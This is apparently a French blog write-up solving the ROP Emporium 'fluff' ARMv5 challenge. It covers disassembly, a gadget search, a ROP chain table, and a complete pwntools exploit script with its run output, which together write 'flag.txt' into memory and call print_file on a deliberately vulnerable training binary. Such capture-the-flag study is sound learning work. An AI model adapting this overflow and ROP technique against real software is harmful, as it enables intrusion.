---
Title: Ropemporium ARMv5 fluff
Date: 2023-06-26
Tags: [linux, python, ROP, ARMv5, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# armv5 fluff

## Introduction

Cet exercice va nous confronter à des gadgets spécifiques.

L'énoncé ropemporium : [fluff](https://ropemporium.com/challenge/fluff.html)

## Découverte

### Le contenu du challenge

    -rw-r--r-- 1 root root    33 Jul 15  2020 flag.txt
    -rwxr-xr-x 1 root root  8252 Jul 15  2020 fluff_armv5
    -rwxr-xr-x 1 root root  8276 Jul 19  2021 fluff_armv5-hf
    -rw-r--r-- 1 1000 1000 11250 Jul 19  2021 fluff_armv5.zip
    -rwxr-xr-x 1 root root  7816 Jul 19  2021 libfluff_armv5-hf.so
    -rwxr-xr-x 1 root root  7804 Jul 15  2020 libfluff_armv5.so

### Execution avec qemu

    armv5/06_fluff# qemu-arm fluff_armv5
    fluff by ROP Emporium
    ARMv5

    You know changing these strings means I have to rewrite my solutions...
    > OKOKOKOKKKKKKKKKKKKKKKKKKKKKKK
    Thank you!


## Analyse

### Le programme principal


    ┌ 24: int main (int argc, char **argv, char **envp);
    │           ; var int32_t var_4h @ sp+0x4
    │           0x000105b8      00482de9       push {fp, lr}
    │           0x000105bc      04b08de2       add fp, var_4h
    │           0x000105c0      b1ffffeb       bl sym.imp.pwnme
    │           0x000105c4      0030a0e3       mov r3, 0
    │           0x000105c8      0300a0e1       mov r0, r3
    └           0x000105cc      0088bde8       pop {fp, pc}

Le programme embarque un fonction inutilisée mais qui appelle la fonction print_file.
De cet fait la fonction possède une entrée dans la PLT.

    ┌ 24: sym.usefulFunction ();
    │           ; var int32_t var_4h @ sp+0x4
    │           0x000105d0      00482de9       push {fp, lr}
    │           0x000105d4      04b08de2       add fp, var_4h
    │           0x000105d8      08009fe5       ldr r0, str.nonexistent     ; [0x10674:4]=0x656e6f6e ; "nonexistent"
    │           0x000105dc      b3ffffeb       bl sym.imp.print_file
    │           0x000105e0      0000a0e1       mov r0, r0                  ; 0x10674 ; "nonexistent"
    └           0x000105e4      0088bde8       pop {fp, pc}

Le programme embarque en particulier un symbol attirant notre attention sur des gadgets utiles :

            ;-- questionableGadgets:
            0x000105ec      0b00bde8       pop {r0, r1, r3}
            0x000105f0      11ff2fe1       bx r1


## La librairie


### Recherche de gadgets

Pour écrire notre chaîne :

Le seul gadget d'ecriture (str) est le suivant :

    0x000101c8 : strbhs r0, [r0], #-0x580 ; andeq r0, r0, r4 ; andeq r0, r0, r8 ; andeq r0, r0, sp ; ldmda r4!, {r8, sb, sl, fp, sp, pc}

strbhs stock le contenu de r0 à l'adresse pointée par r0 - 0x580.

Il n'est donc pas utilisable.

En mode THUMB.

    # ROPgadget --binary fluff_armv5 --thumb
    Gadgets information
    ============================================================


    0x000103ea : str r6, [r5, #0x44] ; bx r0
    0x000103e8 : str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0

On a un gadget ne mode thumb qui nous permet de stocker le contenu de r6 à l'adresse contenude dans r5-0x44.

    0x000103ea : str r6, [r5, #0x44] ; bx r0

Pour charger r5 et r6 on a en mode 32 bits :
    0x00010658 : pop {r4, r5, r6, r7, r8, sb, sl, pc}

Et pour charger r0 en vue de bx r0  et passer en mode thumb :

    0x000105ec     pop {r0, r1, r3}; bx r1

Avec cela on peut écrire "flag.txt" dans .data.

Ensuite pour appeller print_file il nous faut charger r0 avec l'adresse de la chaîne.

    0x00010474     pop {r3, pc}
    0x000105c8     mov r0, r3 ; pop {fp, pc}

### La chaine de ROP

| Valeur | gadget | commentaire |
| ----------- | ------- | ----- |
|  | | Première moitié |
| 0x00010658 | pop {r4, r5, r6, r7, r8, sb, sl, pc} | Charges les 7 registres
| 0 | | pour r4 |
| .data-0x44 | |pour r5, adresse cible -0x44 |
| b"flag" || pour r6 : |
| 0 | |pour r7 |
| 0 | |pour r8 |
| 0 | |pour sb |
| 0 | |pour sl |
| 0x000105ec | pop {r0, r1, r3}; bx r1  | charge r0 et r1 et execute le gadget chargé dans r1 en mode thumb
| | | Seconde moitié |
| 0x00010658 | pop {r4, r5, r6, r7, r8, sb, sl, pc} | pour r0 en vue de `bx r0` juste après|
| 0x000103ea+1 | str r6, [r5, #0x44] ; bx r0 | pour r1 : ecrit r6 et saute à r0 en mode 32|
| 0|| r3 |
| 0 | | pour r4 du gadget pop {r4, r5, r6, r7, r8, sb, sl, pc}  |
| .data-0x44+4 | | pour r5 |
| b".txt" | | pour r6 |
| 0 | |pour r7 |
| 0 | |pour r8 |
| 0 | |pour sb |
| 0 | |pour sl |
| 0x000105ec | pop {r0, r1, r3}; bx r1  | charge r0 et r1 et execute le gadget chargé dans r1 en mode thumb
| 0x00010658 | pop {r4, r5, r6, r7, r8, sb, sl, pc} | pour r0 en vue de `bx r0` juste après|
| 0x000103ea+1 | str r6, [r5, #0x44] ; bx r0 | pour r1 : ecrit r6 et saute à r0 en mode 32|
| | | Appel de print_file |
| .data | | pour r3 |
|0x000105c8 | mov r0, r3 ; pop {fp, pc}| r0=.data
|0| | Pour pop fp |
| print_file || retour sur print_file


## Exploitation

### Le script python

```python
##!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# ropemporium ARMv5 fluff
# Set up pwntools for the correct architecture
elf = context.binary = ELF('fluff_armv5')

# 164 : read
# 176 : ret
gs='''
b *pwnme+176
'''

# Gadgets
# En mode 32
# pop {r4, r5, r6, r7, r8, sb, sl, pc}
g_pop_r45678 = 0x010658

# pop {r0, r1, r3}; bx r1
g_pop_r013_bxr1 = 0x000105ec

# pop {r3, pc}
g_pop_r3 = 0x00010474

# 0x000105c8 : mov r0, r3 ; pop {fp, pc}
g_mov_r0r3 = 0x000105c8

# En mode thumb
# str r6, [r5, #0x44] ; bx r0
g_str_r6r5_bxr0 = 0x000103ea

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])

data = elf.get_section_by_name('.data').header['sh_addr']
print_file = elf.plt['print_file']

log.info(f".data       = 0x{data}")
log.info(f".print_file = 0x{print_file}")

io.recvuntil(b"> ")

offset=0x24

flagfile=b"flag.txt"

PL=b"A"*offset
# "flag"
PL+=p32(g_pop_r45678)
PL+=p32(0)               # r4
PL+=p32(data-0x44)       # r5
PL+=flagfile[:4]         # r6
PL+=p32(0)               # r7
PL+=p32(0)               # r8
PL+=p32(0)               # sb
PL+=p32(0)               # sl
PL+=p32(g_pop_r013_bxr1) # pc
PL+=p32(g_pop_r45678)    # r0
PL+=p32(g_str_r6r5_bxr0+1) # r1
PL+=p32(0)               # r3 fake

# ".txt"
PL+=p32(0)               # r4
PL+=p32(data+4-0x44)     # r5
PL+=flagfile[4:8]        # r6
PL+=p32(0)               # r7
PL+=p32(0)               # r8
PL+=p32(0)               # sb
PL+=p32(0)               # sl
PL+=p32(g_pop_r013_bxr1) # pc
PL+=p32(g_pop_r3)    # r0 : gadget suivant
PL+=p32(g_str_r6r5_bxr0+1) # r1
PL+=p32(0)               # r3 fake

# appel de print_file
PL+=p32(data)            # consommé par pop r3
PL+=p32(g_mov_r0r3)      # mov r0,r3; pop{r11,pc}
PL+=p32(0)               # pour r11
PL+=p32(print_file)

io.sendline(PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()
```
### Son déroulement

    armv5/06_fluff$ python3 solve.py
    [*] '/home/jce/w/ropemporium/armv5/06_fluff/fluff_armv5'
        Arch:     arm-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x10000)
        RUNPATH:  b'.'
    [+] Starting local process '/home/jce/w/ropemporium/armv5/06_fluff/fluff_armv5': pid 14999
    [*] .data       = 0x135204
    [*] .print_file = 0x66736
    [+] flag : ROPE{a_placeholder_32byte_flag!}
    [*] Stopped process '/home/jce/w/ropemporium/armv5/06_fluff/fluff_armv5' (pid 14999)
